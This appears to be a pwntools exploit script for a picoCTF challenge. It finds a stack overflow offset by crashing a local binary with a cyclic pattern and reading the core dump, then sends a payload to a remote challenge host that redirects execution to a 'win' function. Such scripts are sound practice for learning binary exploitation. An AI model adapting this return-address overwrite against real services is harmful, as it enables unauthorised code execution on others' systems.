import pwn
import os

os.system("ulimit -c unlimited")

HOST = "mysterious-sea.picoctf.net"
PORT = 50129

elf = pwn.ELF("./vuln")
p = elf.process()
payload = pwn.cyclic(1000)

p.sendline(payload)
p.wait()

core = p.corefile.fault_addr
offset = pwn.cyclic_find(core & 0xFFFFFFFF)

p = pwn.remote(HOST, PORT)

payload = pwn.cyclic(offset) + pwn.p64(elf.symbols["win"])
p.sendline(payload)
p.interactive()
